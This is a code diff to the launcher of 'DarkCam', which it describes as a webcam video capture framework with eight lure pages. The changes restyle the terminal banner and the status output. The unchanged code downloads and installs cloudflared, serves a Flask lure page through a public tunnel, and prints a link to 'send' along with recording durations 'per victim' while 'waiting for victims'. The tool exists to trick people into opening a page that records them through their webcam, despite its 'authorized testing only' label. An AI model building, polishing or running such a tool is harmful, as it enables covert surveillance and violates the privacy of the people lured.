@@ -12,34 +12,36 @@ import subprocess
 import threading
 import signal
 
-try:
-    from colorama import Fore, Style, init
-    init(autoreset=True)
-except ImportError:
-    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "-q"])
-    from colorama import Fore, Style, init
-    init(autoreset=True)
+_G = "\033[38;5;196m"   # neon red
+_O = "\033[38;5;208m"   # neon orange
+_W = "\033[38;5;255m"   # bright white
+_D = "\033[38;5;240m"   # dim grey
+_B = "\033[1m"          # bold
+_R = "\033[0m"          # reset
 
 BANNER = f"""
-{Fore.RED}
-  ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ █████╗ ███╗   ███╗
-  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗████╗ ████║
-  ██║  ██║███████║██████╔╝█████╔╝ ██║     ███████║██╔████╔██║
-  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║     ██╔══██║██║╚██╔╝██║
-  ██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗██║  ██║██║ ╚═╝ ██║
-  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝{Style.RESET_ALL}
+{_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
+{_G} ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ {_O} ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒{_R}
+{_G} ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ {_O} ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░{_R}
+{_G} ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ {_O} ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ {_R}
+{_G} ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄{_O} ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒{_R}
+{_G}  ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒{_O} ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░{_R}
+{_G}  ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░{_O}   ░  ▒     ▒   ▒▒ ░░  ░      ░{_R}
+{_G}  ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ {_O} ░          ░   ▒   ░      ░   {_R}
+{_G}    ░          ░  ░   ░     ░  ░   {_O} ░ ░             ░  ░       ░   {_R}
+{_G}  ░                                {_O} ░                               {_R}
 
-{Fore.RED}  ╔══════════════════════════════════════════════════════════════╗
-  ║   Webcam Video Capture Framework  │  Red Team Use Only       ║
-  ║   By: Yaman RedTeam               │  v1.0.0                  ║
-  ║   github.com/Yaman-RedTeam/darkcam│  8 Lure Pages            ║
-  ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{_D}        ┌──────────────────────────────────────────────────────────────┐{_R}
+{_D}        │{_R}  {_O}{_B}🎥 DarkCam{_R}  {_D}•{_R}  {_W}Webcam Video Capture Framework{_R}  {_D}•{_R}  {_G}v1.0.0{_R}   {_D}│{_R}
+{_D}        │{_R}  {_W}Developed by{_R} {_O}{_B}Yaman.RedTeam{_R}  {_D}•{_R}  {_G}Authorized Testing Only{_R}      {_D}│{_R}
+{_D}        │{_R}  {_D}➜{_R} {_W}github.com/Yaman-RedTeam/darkcam{_R}  {_D}•{_R}  {_W}8 Lure Pages{_R}           {_D}│{_R}
+{_D}        └──────────────────────────────────────────────────────────────┘{_R}
 """
 
 def check_cloudflared():
     result = subprocess.run(["which", "cloudflared"], capture_output=True)
     if result.returncode != 0:
-        print(f"{Fore.YELLOW}  [!] cloudflared not found. Installing...{Style.RESET_ALL}")
+        print(f"{_O}  [!] cloudflared not found. Installing...{_R}")
         arch = subprocess.check_output(["uname", "-m"], text=True).strip()
         binary = "cloudflared-linux-arm64" if "arm" in arch or "aarch" in arch else "cloudflared-linux-amd64"
         subprocess.run(
@@ -47,7 +49,7 @@ def check_cloudflared():
             f"-o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared",
             shell=True, check=True
         )
-        print(f"{Fore.GREEN}  [+] cloudflared installed.{Style.RESET_ALL}")
+        print(f"{_G}  [+] cloudflared installed.{_R}")
 
 def start_tunnel(port: int) -> str:
     """Start cloudflared tunnel and return the public URL."""
@@ -86,16 +88,17 @@ def start_flask(page: str, port: int):
     time.sleep(1.5)  # let flask boot
 
 def print_info(url: str, page: str, port: int, duration: int):
-    print(f"\n{Fore.CYAN}  ╔══════════════════════════════════════════════╗")
-    print(f"  ║              CAMTRAP ACTIVE                  ║")
-    print(f"  ╚══════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Lure Page   : {Fore.YELLOW}{page.upper()}{Style.RESET_ALL}")
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Local URL   : http://localhost:{port}")
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Public URL  : {Fore.CYAN}{url}{Style.RESET_ALL}  ← Send this")
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Output Dir  : {os.path.abspath('output/')}")
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Rec Duration: {duration}s per victim")
-    print(f"\n  {Fore.RED}[!]{Style.RESET_ALL} Waiting for victims... (Ctrl+C to stop)\n")
-    print(f"  {'─'*50}")
+    print(f"\n{_D}  ┌──────────────────────────────────────────────────────┐{_R}")
+    print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM ACTIVE{_R}                                      {_D}│{_R}")
+    print(f"{_D}  ├──────────────────────────────────────────────────────┤{_R}")
+    print(f"{_D}  │{_R}  {_D}Lure Page   :{_R}  {_O}{page.upper()}{_R}")
+    print(f"{_D}  │{_R}  {_D}Local URL   :{_R}  http://localhost:{port}")
+    print(f"{_D}  │{_R}  {_D}Public URL  :{_R}  {_W}{url}{_R}")
+    print(f"{_D}  │{_R}  {_D}Output Dir  :{_R}  {os.path.abspath('output/')}")
+    print(f"{_D}  │{_R}  {_D}Rec Duration:{_R}  {duration}s per victim")
+    print(f"{_D}  └──────────────────────────────────────────────────────┘{_R}")
+    print(f"\n  {_O}[!]{_R} Waiting for victims... (Ctrl+C to stop)\n")
+    print(f"  {_D}{'─'*54}{_R}")
 
 def main():
     parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
@@ -108,34 +111,34 @@ def main():
     print(BANNER)
 
     # install deps
-    print(f"  {Fore.YELLOW}[*]{Style.RESET_ALL} Checking dependencies...")
+    print(f"  {_O}[*]{_R} Checking dependencies...")
     req_path = os.path.join(os.path.dirname(__file__), "requirements.txt")
     subprocess.run([sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"], check=True)
 
     if not args.no_tunnel:
         check_cloudflared()
 
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Starting Flask server on port {args.port}...")
+    print(f"  {_G}[+]{_R} Starting Flask server on port {args.port}...")
     start_flask(args.page, args.port)
-    print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Flask server running.")
+    print(f"  {_G}[+]{_R} Flask server running.")
 
     tunnel_proc = None
     public_url = f"http://localhost:{args.port}"
 
     if not args.no_tunnel:
-        print(f"  {Fore.YELLOW}[*]{Style.RESET_ALL} Starting cloudflared tunnel...")
+        print(f"  {_O}[*]{_R} Starting cloudflared tunnel...")
         public_url, tunnel_proc = start_tunnel(args.port)
         if not public_url:
-            print(f"  {Fore.RED}[-]{Style.RESET_ALL} Could not get tunnel URL. Use --no-tunnel for local only.")
+            print(f"  {_G}[-]{_R} Could not get tunnel URL. Use --no-tunnel for local only.")
             sys.exit(1)
 
     print_info(public_url, args.page, args.port, args.duration)
 
     def cleanup(sig=None, frame=None):
-        print(f"\n\n  {Fore.YELLOW}[!]{Style.RESET_ALL} Shutting down CamTrap...")
+        print(f"\n\n  {_O}[!]{_R} Shutting down DarkCam...")
         if tunnel_proc:
             tunnel_proc.terminate()
-        print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} DarkCam stopped. Captured files saved in: output/")
+        print(f"  {_G}[+]{_R} DarkCam stopped. Captured files saved in: output/")
         sys.exit(0)
 
     signal.signal(signal.SIGINT, cleanup)
